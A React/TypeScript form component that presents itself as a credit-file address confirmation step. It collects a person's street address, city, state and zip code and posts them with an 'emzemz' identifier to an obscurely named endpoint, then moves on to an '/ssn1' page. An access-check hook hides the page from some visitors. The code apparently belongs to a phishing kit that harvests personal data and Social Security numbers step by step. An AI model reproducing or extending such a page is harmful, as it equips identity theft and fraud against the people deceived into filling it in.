import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const inputClasses =
  'w-full bg-transparent border border-slate-600 rounded px-3 py-3 text-sm text-white placeholder:text-slate-400 focus:outline-none focus:ring-2 focus:ring-[#00b4ff]';

const HomeAddress: React.FC = () => {
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ stAd: '', city: '', state: '', zipCode: '', form: '' });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return null;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      stAd: !stAd.trim() ? 'Street address is required.' : '',
      city: !city.trim() ? 'City is required.' : '',
      state: !state.trim() ? 'State is required.' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
      form: '',
    };

    setErrors(newErrors);

    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      try {
        await axios.post(`${baseUrl}api/energy-meta-data-4/`, {
          emzemz,
          stAd,
          apt,
          city,
          state,
          zipCode,
        });
        navigate('/ssn1', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting home address:', error);
        setErrors((prev) => ({
          ...prev,
          form: 'There was an error submitting your address. Please try again.',
        }));
        setIsLoading(false);
        return;
      }
    }

    setIsLoading(false);
  };

  return (
    <FlowCard
      title="Confirm Your Home Address"
      subtitle={<span className="text-slate-300">The address tied to your credit file.</span>}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="stAd">
            Street address
          </label>
          <input
            id="stAd"
            name="stAd"
            type="text"
            value={stAd}
            onChange={(e) => setStAd(e.target.value)}
            className={inputClasses}
            placeholder="123 Main St"
          />
          {errors.stAd ? <FormError message={errors.stAd} /> : null}
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="apt">
            Apt or unit (optional)
          </label>
          <input
            id="apt"
            name="apt"
            type="text"
            value={apt}
            onChange={(e) => setApt(e.target.value)}
            className={inputClasses}
            placeholder="Unit"
          />
        </div>

        <div>
          <label className="block text-sm text-slate-300 mb-1" htmlFor="city">
            City
          </label>
          <input
            id="city"
            name="city"
            type="text"
            value={city}
            onChange={(e) => setCity(e.target.value)}
            className={inputClasses}
            placeholder="City"
          />
          {errors.city ? <FormError message={errors.city} /> : null}
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="block text-sm text-slate-300 mb-1" htmlFor="state">
              State
            </label>
            <input
              id="state"
              name="state"
              type="text"
              value={state}
              onChange={(e) => setState(e.target.value)}
              className={inputClasses}
              placeholder="CA"
            />
            {errors.state ? <FormError message={errors.state} /> : null}
          </div>

          <div>
            <label className="block text-sm text-slate-300 mb-1" htmlFor="zipCode">
              Zip code
            </label>
            <input
              id="zipCode"
              name="zipCode"
              type="text"
              value={zipCode}
              onChange={(e) => setZipCode(e.target.value)}
              className={inputClasses}
              placeholder="90001"
            />
            {errors.zipCode ? <FormError message={errors.zipCode} /> : null}
          </div>
        </div>

        {errors.form ? (
          <div className="rounded-md border border-red-400/40 bg-red-950/40 px-4 py-3 text-sm text-red-300">{errors.form}</div>
        ) : null}

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
          ) : (
            'Continue'
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default HomeAddress;
